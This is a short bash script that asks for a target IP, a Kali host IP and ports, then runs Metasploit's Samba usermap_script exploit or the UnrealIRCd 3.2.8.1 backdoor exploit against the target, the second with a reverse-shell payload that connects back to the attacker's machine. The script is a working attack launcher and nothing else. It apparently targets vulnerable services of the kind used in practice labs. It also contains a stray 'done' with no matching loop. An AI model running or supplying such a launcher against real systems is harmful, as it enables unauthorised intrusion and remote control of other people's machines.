#!/bin/bash

echo "Enter Your Attack IP: "
read ip

echo "Enter Your Kali IP: "
read lhost

echo "Enter The LPORT AKA Local Port: "
read lport

echo "Enter Attack Port AKA RPORT: "
read rport

echo -n "Would you like to the Samba or IRC Exploit?... Enter 1 for Samba or 2 for IRC: "
read VAR
	if [[ $VAR = 1 ]]; then
      		msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit"
	fi
	if [[ $VAR = 2 ]]; then
      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploit"
	fi
done
